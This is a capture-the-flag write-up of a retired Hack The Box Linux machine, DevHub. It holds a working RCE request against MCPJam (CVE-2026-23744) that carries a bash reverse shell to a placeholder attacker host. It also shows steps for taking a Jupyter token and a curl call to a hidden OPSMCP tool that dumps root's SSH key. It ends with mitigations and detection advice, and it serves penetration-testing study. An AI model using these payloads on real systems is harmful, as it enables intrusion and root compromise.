---
machine: DevHub
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, mcp, cve-2026-23744, jupyter, privesc]
---

# DevHub — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The `devhub.htb` portal advertises an MCP inspector, Jupyter and a Git server. Port `6274` runs MCPJam 1.4.2, vulnerable to CVE-2026-23744: `/api/mcp/connect` accepts a command and executes it, giving a shell as `mcp-dev`. From there two local services stand out: Jupyter on `8888`, whose token appears in the systemd unit and the process list, and OPSMCP on `5000`. The Jupyter token gives access as `analyst`; their `.opsmcp_key` authenticates to OPSMCP, which exposes a hidden tool that dumps root's SSH key.

## Recon

```bash
nmap -Pn -sCV -p22,80,6274 <IP>
```

- `22` OpenSSH 8.9p1.
- `80` nginx 1.18.0 redirecting to `devhub.htb`.
- `6274` MCPJam Inspector 1.4.2.

```bash
echo '<IP> devhub.htb' | sudo tee -a /etc/hosts
```

The site is static and mentions an internal Jupyter service on `8888`, a Git server and MCP Inspector. Directory brute force adds nothing.

## Enumeration

`http://devhub.htb:6274/` shows version `v1.4.2` under Settings. Searching for vulnerabilities in that version leads to CVE-2026-23744: MCPJam listens on `0.0.0.0` by default and lets an HTTP request install and run an arbitrary MCP server.

```bash
curl -s http://devhub.htb:6274/ | head
```

## Foothold

The vulnerable endpoint takes a `serverConfig` with `command` and `args`:

```bash
curl -k http://devhub.htb:6274/api/mcp/connect \
  -H 'Content-Type: application/json' \
  --data '{
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "bash -i >& /dev/tcp/<ATTACKER>/443 0>&1"],
      "env": {}
    },
    "serverId": "poc"
  }'
```

The request may hang or return `Connection closed`; the command still runs and a shell as `mcp-dev` appears. For a stable session, write an SSH key to `~/.ssh/authorized_keys`.

## Lateral movement

```bash
netstat -tnlp
```

Two local ports matter:

- `127.0.0.1:8888` — Jupyter.
- `127.0.0.1:5000` — OPSMCP.

`/etc/systemd/system/jupyter.service` runs as `analyst` and contains the Jupyter token and notebook directory. The token is also visible in the process command line. Forward the port:

```bash
ssh -L 8888:localhost:8888 mcp-dev@devhub.htb
```

Open a terminal in Jupyter to get a shell as `analyst`. Their home contains `.opsmcp_key`, and `/opt/opsmcp/server.py` runs as root. The source reveals visible tools and two hidden ones: `ops._debug_mode` and `ops._admin_dump`.

## Privilege escalation

The `.opsmcp_key` value goes in the `X-API-Key` header. `ops._admin_dump` accepts `target: "ssh_keys"` and any truthy `confirm` value:

```bash
KEY=$(cat ~/.opsmcp_key)
curl -s http://127.0.0.1:5000/tools/call \
  -H "X-API-Key: $KEY" \
  -H 'Content-Type: application/json' \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":"true"}}'
```

The response contains root's private key. Save it with `600` permissions and connect:

```bash
chmod 600 id_rsa_root
ssh -i id_rsa_root root@devhub.htb
```

## Evidence

- MCPJam banner and Settings showing version 1.4.2.
- Request to `/api/mcp/connect` and a shell as `mcp-dev`.
- `netstat` showing `5000` and `8888` on loopback.
- systemd unit and `ps` output with the Jupyter token.
- `.opsmcp_key` and the `ops._admin_dump` response containing root's key.
- `id` as root over SSH.

## Lessons learned

- A development tool listening on `0.0.0.0` can be remote RCE even when it is meant for local use.
- Jupyter tokens show up in systemd units and `ps`; a loopback port is not a security boundary.
- The source of an internal service can reveal hidden tools that never appear in `/tools/list`.
- An over-privileged API key turns a “recovery” feature into a backdoor.

## Mitigations and detection

- Upgrade MCPJam to 1.4.3 or later and bind it to `127.0.0.1` only.
- Do not let an API install or run MCP servers without authentication and a command allowlist.
- Keep tokens out of unit files and process command lines; use restricted files.
- Run Jupyter and OPSMCP as unprivileged users and separate the recovery key from the API.
- Detect `/api/mcp/connect` requests with `command`/`args`, unexpected child processes of Node, and `/tools/call` requests for `ops._admin_dump`.

## References

- [0xdf — DevHub](https://0xdf.gitlab.io/2026/10/10/htb-devhub.html)
- [IppSec — DevHub](https://www.youtube.com/watch?v=XRqQjK345zo)
- [NVD — CVE-2026-23744](https://nvd.nist.gov/vuln/detail/CVE-2026-23744)
- [Hack The Box — DevHub](https://app.hackthebox.com/machines/devhub)
